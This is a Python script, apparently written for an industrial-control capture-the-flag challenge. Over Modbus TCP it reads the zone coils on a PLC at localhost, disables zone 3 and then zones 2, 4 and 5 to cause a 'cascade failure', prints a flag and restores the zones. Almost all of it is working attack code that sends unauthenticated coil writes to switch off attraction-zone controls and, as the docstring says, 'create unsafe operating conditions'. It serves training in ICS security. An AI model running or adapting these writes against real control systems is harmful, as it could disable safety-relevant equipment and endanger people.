#!/usr/bin/env python3
"""
Zone Manipulation Attack
CTF Challenge: Disable attraction zones during operation

This script demonstrates how to manipulate individual zone controls
to simulate zone failures or create unsafe operating conditions.
"""

from pymodbus.client import ModbusTcpClient
import time

PLC_HOST = 'localhost'
PLC_PORT = 502

def main():
    print("[Zone Manipulation Attack]")
    print("=" * 50)

    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)

    if not client.connect():
        print(f"❌ Failed to connect to PLC at {PLC_HOST}:{PLC_PORT}")
        return

    print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")

    print("\n[Phase 1] Reading current zone status...")
    result = client.read_coils(5, 5)
    if not result.isError():
        zones = result.bits[:5]
        for i, enabled in enumerate(zones, 1):
            print(f"  Zone {i}: {'ENABLED' if enabled else 'DISABLED'}")

    print("\n[Phase 2] Disabling Zone 3...")
    client.write_coil(7, False)  # zone_3_enable = FALSE
    time.sleep(0.5)

    result = client.read_coils(5, 5)
    if not result.isError():
        zones = result.bits[:5]
        print("\n[Updated Zone Status]")
        for i, enabled in enumerate(zones, 1):
            status = 'ENABLED' if enabled else 'DISABLED'
            if i == 3 and not enabled:
                status += " ⚠️ ATTACKED!"
            print(f"  Zone {i}: {status}")

    print("\n[Phase 3] Creating zone cascade failure...")
    for zone_num in [2, 4, 5]:
        print(f"  Disabling Zone {zone_num}...")
        client.write_coil(4 + zone_num, False)
        time.sleep(0.3)

    result = client.read_coils(5, 5)
    if not result.isError():
        zones = result.bits[:5]
        disabled_count = sum(1 for z in zones if not z)
        print(f"\n✓ Attack Complete: {disabled_count}/5 zones disabled")

        if disabled_count >= 1:
            print("\n🎯 CTF FLAG: Zone Manipulation challenge should be completed!")

    print("\n[Phase 4] Restoring zones...")
    for coil_addr in range(5, 10):
        client.write_coil(coil_addr, True)

    print("✓ All zones restored")

    client.close()

if __name__ == '__main__':
    main()
